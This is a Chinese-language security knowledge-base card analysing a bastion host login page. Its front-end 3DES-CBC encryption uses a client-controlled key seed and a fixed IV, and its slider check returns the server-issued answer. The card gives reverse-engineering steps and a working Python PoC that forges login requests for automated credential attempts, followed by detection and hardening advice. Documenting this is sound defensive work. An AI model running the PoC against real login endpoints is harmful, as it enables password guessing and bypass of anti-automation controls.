---
id: web-generic-auth-bastion-frontend-3des-login-forgery
title: 堡垒机登录前端 3DES-CBC 加密逆向与滑块参数伪造
type: scenario
domain: web
path: web/generic/auth
technique: bastion-frontend-3des-login-forgery
tags:
- bastion
- iam
- 3des
- cbc
- javascript
- auth
- automation
- slider
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:28:02+08:00'
  notes: 已对照原文核对 3DES-CBC 密钥派生（c 取 1/3/5/末位重复8次）、固定 IV 99999999、q/c 字段与滑块 secRandomRegion 回传；未验证点：伪造请求仅返回 659 Incorrect user name or password，原文未展示有效凭据登录成功，最终认证绕过未证明
url: /docs/web/generic/auth/web-generic-auth-bastion-frontend-3des-login-forgery/
draft: false
kb_aliases:
- 堡垒机登录逆向
- 前端 3DES 登录加密
- q c 参数伪造
- secRandomRegion 滑块绕过
- 登录请求自动化构造
---

## 一句话结论

堡垒机登录页把 `id/passwd/滑块位置` 用前端 3DES-CBC 加密成 `q`，密钥由客户端随机串 `c` 派生、IV 固定为 `99999999`；逆向 JS 后可在 Python 中复现加密并任意构造 `q/c`，同时滑块校验值 `secRandomRegion` 由服务端明文下发，导致前端加密与滑块防自动化均可绕开。

## 原理

- 登录页 `/authc/mode/trunk` 返回认证方式与 `meta.secRandomRegion`（滑块应停位置）；前端把该值传给 `$('#drag').drag({stop: secRandomRegion})`，登录时又原样回传，等于服务端把“答案”直接交给客户端，滑块只校验是否回传了该值，不构成防自动化。
- 登录请求 `/authc/trunk` 的 body 只含 `q`（密文）与 `c`（随机串）。`serializeSecurityArrayToJson()` 的逻辑：
  1. `pt3 = randomStr(10,8)` 生成 10 位随机串，作为 `c`；
  2. `p4 = reqSecurypt(pt3)`：取 `pt3[0]+pt3[2]+pt3[4]+pt3[9]` 四个字符，重复 8 次得到 32 字符；
  3. `d5 = CryptoJS.enc.Base64.parse(p4)`，把 `p4` 当 Base64 解析成 24 字节，作为 3DES 密钥；
  4. `iv = '99999999'`（固定 8 字节）；
  5. `3DES-CBC + PKCS7` 加密 `serializeInputObject("cho-must-authc")`（含 `id`、`simplePasswd`、`secRandomRegion`），输出 Base64 密文 `q`。
- 密钥材料完全来自客户端可控的 `c`，服务端只是用同一个 `c` 重新派生密钥解密；固定 IV 进一步降低随机性。攻击者无需知道任何服务端密钥，按同一算法即可生成任意合法 `q`。
- 后端 `decode(map)` 逻辑相同：取 `c` 的第 1/3/5/末位字符重复 8 次作为密钥，`Crypto3DesUtil.Decrypt3DesCBC(q, key)` 解密，说明这是纯客户端加密、服务端无额外签名/时间戳绑定。
- 本质上前端加密只提高抓包可读性门槛，不提供真实性；拿到登录页 JS 即可离线复现。

## 触发条件

- 目标登录接口使用前端 JS 加密请求体（`q`/`c` 一类字段），且加密算法/密钥派生全部在客户端。
- 攻击者可访问登录页与 JS 文件，并能在本地复现算法。
- 登录接口没有额外的服务端签名、时间戳/nonce 或设备指纹绑定（原文未见）。
- 滑块/验证码等防自动化值由服务端下发并可原样回传，或可被脚本获取。
- 已获得目标账号或处于授权内的凭据测试范围；否则只能自动化尝试，不能保证登录成功。

## 利用步骤

1. 抓包定位登录相关请求：`GET /iam-web/authc/mode/trunk`（初始化/滑块位置）与 `POST /iam-web/authc/trunk`（登录）。
2. 在浏览器 DevTools 对 `ApolloAjax._post` 下断点，确认请求体在加密前是明文 `{id, simplePasswd, secRandomRegion}`。
3. 跟进 `serializeSecurityArrayToJson` → `reqSecurypt` → `Tripledes.js`，还原密钥派生、IV、模式与填充。
4. 用 Python 复现：根据固定 `c` 派生密钥，3DES-CBC 加密任意明文，Base64 得到 `q`。
5. 先 `GET /authc/mode/trunk` 拿 Cookie 与 `meta.secRandomRegion`，把该值写入明文；再 `POST /authc/trunk` 提交 `{"q":..., "c":...}`。
6. 观察响应：服务端能正常解密并返回认证结果（如 `Incorrect user name or password`），说明请求伪造成功；后续结合凭据测试/弱口令进行自动化尝试。

## PoC

```python
from Crypto.Cipher import DES3
import base64, json, requests

c = "dO4SmQzdb"                      # 任意 10 位串，攻击者自选

def req_securypt(pt3):
    return (pt3[0] + pt3[2] + pt3[4] + pt3[-1]) * 8

p4 = req_securypt(c)
key = base64.b64decode(p4 + "===")   # 24 字节 3DES key
iv = b"99999999"

# 1) 取滑块位置与 Cookie
r = requests.get("https://target/iam-web/authc/mode/trunk", verify=False)
region = r.json()["meta"]["secRandomRegion"]

data = {"id": "123", "simplePasswd": "123", "secRandomRegion": str(region)}
pt = json.dumps(data).encode()
pad = 8 - len(pt) % 8
pt += bytes([pad]) * pad
q = base64.b64encode(DES3.new(key, DES3.MODE_CBC, iv).encrypt(pt)).decode()

# 2) 伪造登录请求
r2 = requests.post("https://target/iam-web/authc/trunk",
                   json={"q": q, "c": c}, verify=False)
print(r2.text)
```

实测：服务端返回 `{"status":659,...,"msg":"Incorrect user name or password",...}`，说明 `q/c` 被正常解密并进入认证流程（非解密失败/签名错误）；原文未展示有效凭据登录成功。

## 变体与关联

- 变体：`c` 可固定也可每次随机；由于密钥只由 `c` 派生，服务端无法区分攻击者构造与浏览器生成。
- 变体：若目标使用 AES/RSA/SM4，逆向步骤相同，只是算法与密钥派生不同。
- 关联：与 CAS 登录前端 AES-CBC 逆向卡同属“前端登录加密可离线复现 → 自动化登录参数构造”；本卡额外覆盖 3DES、固定 IV、客户端可控密钥种子与服务端下发滑块答案。
- 关联卡片：[[web-generic-auth-cas-aes-cbc-login-encryption-reverse]]

## 检测与防御

- 检测：同一 IP 高频 `GET /authc/mode/trunk` 获取滑块位置，随后高频 `POST /authc/trunk`。
- 检测：登录请求的 `c` 长度/字符分布异常、`q` 密文长度固定且每次相同（固定 c/固定明文时）。
- 检测：滑块位置请求与登录请求间隔极短、拖动轨迹缺失（无鼠标/触摸事件上报）。
- 修复：不要把滑块答案明文下发给客户端；改为服务端校验行为轨迹/一次性挑战（challenge-response），并对挑战签名、绑定会话与时效。
- 加固：前端加密不能替代服务端认证；增加请求签名、时间戳/nonce、设备指纹；按 IP/账号做失败计数、锁定与验证码；对自动化登录做风控。
- 注意：前端加密与滑块只是提高自动化成本，逆向可复现；真正的防线是服务端频率限制、凭据策略与风控。
